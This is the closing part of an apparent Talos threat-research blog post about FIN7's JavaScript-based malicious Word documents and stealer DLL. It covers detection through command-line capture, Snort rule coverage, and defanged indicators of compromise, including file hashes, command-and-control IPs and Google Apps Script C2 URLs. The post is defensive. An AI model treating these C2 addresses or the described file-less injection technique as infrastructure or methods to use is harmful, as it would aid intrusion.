id="amp-for-endpoints-amp-for-endpoints-has-the-ability-to-observe-dynamic-activity-through-a-number-of-methods-one-of-these-is-the-capture-of-command-line-arguments-which-are-then-sent-to-the-amp-cloud-for-analysis-in-this-case-we-re-able-to-observe-the-execution-of-wscript-exe-when-the-ole-object-is-clicked-">AMP for Endpoints &nbsp;AMP for Endpoints has the ability to observe dynamic activity through a number of methods. One of these is the capture of command line arguments which are then sent to the AMP cloud for analysis. In this case, we're able to observe the execution of wscript.exe when the OLE object is clicked:</h3><figure class="kg-card kg-image-card"><img src="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/image11.png" class="kg-image" alt="" loading="lazy"></figure><p><br> <b>Figure 27: Captured Command Line Arguments in AMP for Endpoints Device Trajectory</b></p><p>This triggers an Indicator of Compromise which can then be further investigated:</p><figure class="kg-card kg-image-card"><img src="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/image8.png" class="kg-image" alt="" loading="lazy"></figure><p><br> <b>Figure 28: Indicator of Compromise from Captured Command Line Arguments</b><br></p><h2 id="conclusion-the-fin7-group-is-an-example-of-an-advanced-adversary-targeting-a-variety-of-industries-using-conventional-technologies-that-ship-with-most-versions-of-microsoft-windows-through-the-use-of-microsoft-word-documents-to-ship-entire-malware-platforms-they-have-the-ability-to-leverage-scripting-languages-to-access-activex-controls-and-file-less-techniques-to-inject-shipped-portable-executables-into-memory-using-powershell-without-ever-having-the-portable-executable-touch-disk-clustering-javascript-also-demonstrates-a-number-of-ways-fin7-makes-minor-changes-between-releases-and-establishes-outliers-to-observe-major-changes-through-the-observation-of-static-and-dynamic-attributes-we-re-able-to-establish-indicators-of-compromise-based-on-the-embedded-ole-object-which-can-be-used-to-identify-fin7-documents-and-identify-documents-which-may-be-leveraging-similar-functionality-to-protect-our-customers-">Conclusion The FIN7 group is an example of an advanced adversary targeting a variety of industries using conventional technologies that ship with most versions of Microsoft Windows. Through the use of Microsoft Word documents to ship entire malware platforms they have the ability to leverage scripting languages to access ActiveX controls, and "file-less" techniques to inject shipped portable executables into memory using PowerShell without ever having the portable executable touch disk. Clustering JavaScript also demonstrates a number of ways FIN7 makes minor changes between releases, and establishes outliers to observe major changes. Through the observation of static and dynamic attributes we're able to establish indicators of compromise based on the embedded OLE object which can be used to identify FIN7 documents, and identify documents which may be leveraging similar functionality to protect our customers.</h2><h2 id="coverage-talos-has-released-the-following-snort-rule-s-to-address-this-threat-please-note-that-additional-rules-may-be-released-at-a-future-date-and-current-rules-are-subject-to-change-pending-additional-information-firepower-customers-should-use-the-latest-update-to-their-ruleset-by-updating-their-sru-open-source-snort-subscriber-rule-set-customers-can-stay-up-to-date-by-downloading-the-latest-rule-pack-available-for-purchase-on-snort-org-">Coverage &nbsp;Talos has released the following Snort rule(s) to address this threat. Please note that additional rules may be released at a future date and current rules are subject to change pending additional information. Firepower customers should use the latest update to their ruleset by updating their SRU. Open Source Snort Subscriber Rule Set customers can stay up to date by downloading the <a href="https://www.snort.org/products">latest rule pack available</a> for purchase on Snort.org.</h2><p>Snort Rules: 44430-44433</p><p>Additional ways our customers can detect and block this threat are listed below.</p><figure class="kg-card kg-image-card"><img src="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/no-cloudlock.png" class="kg-image" alt="" loading="lazy"></figure><p><br> Advanced Malware Protection (<a href="https://www.cisco.com/c/en/us/products/security/advanced-malware-protection">AMP</a>) is ideally suited to prevent the execution of the malware used by these threat actors.<br> <a href="https://www.cisco.com/c/en/us/products/security/cloud-web-security/index.html">CWS</a> or<a href="https://www.cisco.com/c/en/us/products/security/web-security-appliance/index.html">WSA</a> web scanning prevents access to malicious websites and detects malware used in these attacks.<br> <a href="https://www.cisco.com/c/en/us/products/security/email-security-appliance/index.html">Email Security</a> can block malicious emails sent by threat actors as part of their campaign.</p><p>Network Security appliances such as <a href="https://www.cisco.com/c/en/us/products/security/firewalls/index.html">NGFW</a>, <a href="https://www.cisco.com/c/en/us/products/security/intrusion-prevention-system-ips/index.html">NGIPS</a>, and <a href="https://meraki.cisco.com/products/appliances">Meraki MX</a> can detect malicious activity associated with this threat.<br> <a href="https://www.cisco.com/c/en/us/solutions/enterprise-networks/amp-threat-grid/index.html">AMP Threat Grid</a> helps identify malicious binaries and build protection into all Cisco Security products.<br> <a href="https://umbrella.cisco.com/">Umbrella</a>, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network.</p><h2 id="indicators-of-compromise">Indicators of Compromise</h2><h3 id="javascript-bot-documents-6bc8770206c5f2bb4079f7583615adeb4076f2e2d0c655fbafedd9669dc3a213-df22408833b2ae58f0d3e2fe87581be31972ef56e0ebf5efafc4e6e0341b5521-2b4991b2a2792436b50404dcf6310ef2af2573505810ebac08e32f17aee3fbbe-ebca565e21a42300e19f250f84b927fa3b32debf3fe13003a4aa5b71ed5cbee96604d806eb68fdf914dfb6bbf907a4f2bd9b8757fc4da4e7c5e4de141b8d4e2c">JavaScript Bot Documents 6bc8770206c5f2bb4079f7583615adeb4076f2e2d0c655fbafedd9669dc3a213<br> df22408833b2ae58f0d3e2fe87581be31972ef56e0ebf5efafc4e6e0341b5521<br> 2b4991b2a2792436b50404dcf6310ef2af2573505810ebac08e32f17aee3fbbe<br> ebca565e21a42300e19f250f84b927fa3b32debf3fe13003a4aa5b71ed5cbee9<br>6604d806eb68fdf914dfb6bbf907a4f2bd9b8757fc4da4e7c5e4de141b8d4e2c<br></h3><h3 id="javascript-bot-documents-with-powershell-dll-injection-91f028b1ade885bae2e0c6c3be2f3c3dc692830b45d4cf1a070a0bd159f1f676-ad578311d43d3aea3a5b2908bc6e408b499cc832723225ff915d9a7bc36e0aa4-fadb57aa7a82dbcb2e40c034f52096b63801efc040dd8559a4b8fc873bc962a1-91f028b1ade885bae2e0c6c3be2f3c3dc692830b45d4cf1a070a0bd159f1f676-74a5471c3aa6f9ce0c806e85929c2816ac39082f7fea8dbe8e4e98e986d4be78f73c7ed3765fec13ffd79aef97de519cfbd6a332e81b8a247fe7d1ccb1946c9c">JavaScript Bot Documents with PowerShell DLL Injection 91f028b1ade885bae2e0c6c3be2f3c3dc692830b45d4cf1a070a0bd159f1f676<br> ad578311d43d3aea3a5b2908bc6e408b499cc832723225ff915d9a7bc36e0aa4<br> fadb57aa7a82dbcb2e40c034f52096b63801efc040dd8559a4b8fc873bc962a1<br> 91f028b1ade885bae2e0c6c3be2f3c3dc692830b45d4cf1a070a0bd159f1f676<br> 74a5471c3aa6f9ce0c806e85929c2816ac39082f7fea8dbe8e4e98e986d4be78<br>f73c7ed3765fec13ffd79aef97de519cfbd6a332e81b8a247fe7d1ccb1946c9c<br></h3><h3 id="command-and-control-ips-104-232-34-36-5-149-253-126-185-180-197-20-195-54-162-79-31-148-219-18">Command and Control IPs 104[.]232[.]34[.]36<br> 5[.]149[.]253[.]126<br> 185[.]180[.]197[.]20<br> 195[.]54[.]162[.]79<br> 31[.]148[.]219[.]18<br></h3><h3 id="google-apps-script-command-and-control-urls-hxxps-script-google-com-macros-s-akfycbxvggf-qbkaniwcbfgjohbtkmyfyrpvm91ycgevzgdvajdqfw8_-exec-hxxps-script-google-com-macros-s-akfycbz6dmnjfcpwfchoq6wkjsmjqu22sjtj9pxmueqr7bcpmjhw6bg2-exechxxps-script-google-com-macros-s-akfycbwknc-8rk0cadwo5i4kmymvoxvinfopr1eevz63xixdvcoqoe6p-exec-hxxps-script-google-com-macros-s-akfycbxyiibw9shufv4s5jm6iw-dmvadfortjdm7bzspebf2kpf4in0-exec">Google Apps Script Command and Control URLs hXXps://script[.]google[.]com/macros/s/AKfycbxvGGF-QBkaNIWCBFgjohBtkmyfyRpvm91yCGEvzgDvAJdqfW8_/exec<br> hXXps://script[.]google[.]com/macros/s/AKfycbz6dmNJfCPwFchoq6WkJsMjQu22SJTJ9pxMUeQR7bCpmJhW6Bg2/exec<br>hXXps://script[.]google[.]com/macros/s/AKfycbwkNc-8rk0caDWO5I4KMymvOXVinfOpR1eevZ63xiXDvcoqOE6p/exec<br> hXXps://script[.]google[.]com/macros/s/AKfycbxyiIBW9SHUFV4S5JM6IW-dmVADFOrTJDM7bZspeBf2Kpf4IN0/exec</h3>
+        </div>
+    </section>
+    <div class="social-media-wrapper">
+    <h5>Share this post</h5>
+    <ul class="social-media-share-list">
+        <li>
+            <a class="share-facebook" title="Share this on Facebook" data-text="FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks" data-href="https://blog.talosintelligence.com/fin7-stealer/" rel="nofollow" target="_blank" href="https://www.facebook.com/sharer.php?u=https://blog.talosintelligence.com/fin7-stealer/"></a>
+        </li>
+        <li>
+            <a class="share-twitter" title="Tweet This" data-text="FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks" data-href="https://blog.talosintelligence.com/fin7-stealer/" rel="nofollow" target="_blank" href="https://twitter.com/share?url=https://blog.talosintelligence.com/fin7-stealer/"></a>
+        </li>
+        <li>
+            <a class="share-linkedin" title="Share this on LinkedIn" data-text="FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks" data-href="https://blog.talosintelligence.com/fin7-stealer/" rel="nofollow" target="_blank" href="https://www.linkedin.com/sharing/share-offsite/?url=https://blog.talosintelligence.com/fin7-stealer/"></a>
+        </li>
+        <li>
+            <a class="share-reddit" title="Reddit This" data-text="FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks" data-href="https://blog.talosintelligence.com/fin7-stealer/" rel="nofollow" target="_blank" href="https://www.reddit/submit?url=https://blog.talosintelligence.com/fin7-stealer/"></a>
+        </li>
+        <li>
+            <a class="share-email" title="Email This" href="mailto:?body=FIN7%20Group%20Uses%20JavaScript%20and%20Stealer%20DLL%20Variant%20in%20New%20Attackshttps://blog.talosintelligence.com/fin7-stealer/"></a>
+        </li>
+    </ul>
+</div></article>
+                </div>
+                <div class="col-lg alt-layout-row-dk sidebar" id="side-bar">
+                            <h4>Related Content</h4>
+
+                                <div class="sidebar-snippet-wrapper">
+                                    <a href="https://blog.talosintelligence.com/lazarus_new_rats_dlang_and_telegram/">
+                                        <h3>Operation Blacksmith: Lazarus targets organizations worldwide using novel Telegram-based malware written in DLang</h3>
+                                        <span class="preview-attributes">December 11, 2023 08:50</span>
+                                        <p>Our latest findings indicate a definitive shift in the tactics of the North Korean APT group Lazarus Group.</p>
+                                    </a>
+                                </div>
+                                <div class="sidebar-snippet-wrapper">
+                                    <a href="https://blog.talosintelligence.com/new-sugargh0st-rat/">
+                                        <h3>New SugarGh0st RAT targets Uzbekistan government and South Korea</h3>
+                                        <span class="preview-attributes">November 30, 2023 08:00</span>
+                                        <p>Cisco Talos recently discovered a malicious campaign that likely started as early as August 2023, delivering a new remote access trojan (RAT) we dubbed “SugarGh0st.”</p>
+                                    </a>
+                                </div>
+                                <div class="sidebar-snippet-wrapper">
+                                    <a href="https://blog.talosintelligence.com/roblox-scam-overview/">
+                                        <h3>Attackers use JavaScript URLs, API forms and more to scam users in popular online game “Roblox”</h3>
+                                        <span class="preview-attributes">November 2, 2023 07:58</span>
+                                        <p>Knowing the common scams is an important step in using the platform safely. The following recommendations help players not fall into scams.</p>
+                                    </a>
+                                </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+
+    <footer id="footer">
+    <div class="container-fluid">
+        <div class="row footer_nav_wrapper">
+            <div class="col-lg-10 col-md-9 col-sm-12">
+                <div class="multi-col-list-wrapper">
+                    <ul>
+                        <li>
+                            <a href="https://talosintelligence.com/software">Software</a>
+                        </li>
+                        <li>
+                            <a href="https://talosintelligence.com/reputation_center">Reputation Center</a>
+                        </li>
+                        <li>
+                            <a href="https://talosintelligence.com/vulnerability_info">Vulnerability Information</a>
+                        </li>
+                        <li>
+                            <a href="https://talosintelligence.com/ms_advisories">Microsoft Advisory Snort Rules</a>
+                        </li>
+                        <li>
+                            <a href="https://talosintelligence.com/incident_response">Incident Response</a>
+                        </li>
+                        <li>
+                            <a href="https://talosintelligence.com/amp-naming">Secure Endpoint Naming Conventions</a>
+                        </li>
+                        <li>
+                            <a href="https://talosintelligence.com/talos_file_reputation">Talos File Reputation</a>
+                        </li>
+                        <li>
+                            <a href="https://talosintelligence.com/community">Support Communities</a>
+                        </li>
+                        <li>
+                            <a href="https://talosintelligence.com/about">About</a>
+                        </li>
+                        <li>
+                            <a href="https://talosintelligence.com/careers">Careers</a>
+                        </li>
+                        <li>
+                            <a href="https://blog.talosintelligence.com/">Talos Blog</a>
+                        </li>
+                        <li>
+                            <a href="https://talosintelligence.com/newsletters">Threat Source Newsletter</a>
+                        </li>
+                        <li>
+                            <a href="https://talosintelligence.com/podcasts/shows/beers_with_talos">Beers with Talos Podcast</a>
+                        </li>
+                        <li>
+                            <a href="https://talosintelligence.com/podcasts/shows/talos_takes">Talos Takes Podcast</a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+            <div class="col-lg-2 col-md-3 col-sm-12 connect_social">
+                <h5>Connect with us</h5>
+                <ul>
+                    <li>
+                        <a target="_blank" href="https://twitter.com/talossecurity" rel="nofollow">
+                            <img alt="Follow us on Twitter" src="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/footer_icon_tw.svg">
+                        </a>
+                    </li>
+                    <li>
+                        <a target="_blank" href="https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured" rel="nofollow">
+                            <img alt="Watch our informational videos on YouTube" src="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/footer_icon_yt.svg">
+                        </a>
+                    </li>
+                    <li>
+                        <a target="_blank" href="https://www.linkedin.com/company/cisco-talos-intelligence-group/" rel="nofollow">
+                            <img alt="Connect with us on LinkedIn" src="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/footer_icon_li.svg">
+                        </a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-sm-12 footer_corporate">
+                <a href="http://tools.cisco.com/security/center/home.x" target="_blank">
+                    <img src="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/logo_cisco_white.svg" alt="Cisco Security">
+                </a>
+
+                <p class="copyright">
+                    © <span id="current-year">2023</span> Cisco Systems, Inc. and/or its affiliates. All rights reserved. View our <a href="https://www.cisco.com/web/siteassets/legal/privacy_full.html" class="underline" target="_blank">Privacy Policy</a>
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+    
+
+
+<!-- jQuery first, then Popper.js, then Bootstrap JS -->
+<script src="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/jquery-3.6.0.min.js"></script>
+<script src="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/popper.min.js"></script>
+<script src="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/bootstrap.bundle.min.js"></script>
+<script src="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/date.js"></script>
+<script src="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/prism.js"></script>
+<script src="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/ghost-theme-utils.min.js" async="" defer=""></script>
+
+
+<script defer="" src="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/v84a3a4012de94ce1a686ba8c167c359c1696973893317" integrity="sha512-euoFGowhlaLqXsPWQ48qSkBSCFs3DPRyiwVu3FjR96cMPx+Fr+gpWRhIafcHwqwCqWS42RZhIudOvEI+Ckf6MA==" data-cf-beacon="{&quot;rayId&quot;:&quot;8367f195d9660d7a&quot;,&quot;version&quot;:&quot;2023.10.0&quot;,&quot;token&quot;:&quot;35f8ae698f9d471b83b846a751388737&quot;}" crossorigin="anonymous"></script>
+
+
+<div id="sodo-search-root"></div></body></html>
